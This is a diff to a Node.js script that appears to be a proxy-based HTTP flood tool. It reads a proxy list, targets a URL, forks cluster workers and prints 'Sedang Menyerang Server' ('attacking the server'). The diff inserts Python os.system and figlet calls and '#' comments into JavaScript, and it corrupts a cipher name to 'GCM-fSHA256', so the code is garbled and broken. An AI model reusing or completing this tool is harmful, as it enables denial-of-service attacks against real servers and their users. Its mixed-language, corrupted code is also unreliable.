@@ -6,7 +6,9 @@ const crypto = require('crypto');
 const url = require('url');
 const cluster = require('cluster');
 
-
+#Clear the terminal
+os.system("clear") 
+os.system("figlet Okelah") 
 
 process.on('uncaughtException', function(error) {});
 process.on('unhandledRejection', function(error) {})
@@ -30,10 +32,7 @@ var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').
 var parsed = url.parse(target);
 const payload = {};
 
- #         /----/      /       /   //////   ////
- #        /      /     /     /    /////    / // / 
- #       /_  _  /     //////     //////   /////
- #       /
+
 
 if (cluster.isMaster) {
 	console.log('Sedang Menyerang Server');
@@ -43,7 +42,7 @@ if (cluster.isMaster) {
 } else {
 	const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
 	const cplist = [
-	"ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"];
+	"ECDHE-ECDSA-AES128-GCM-fSHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"];
 	var cipper = "";
 	let SignalsList = sigalgs.join(':');
 
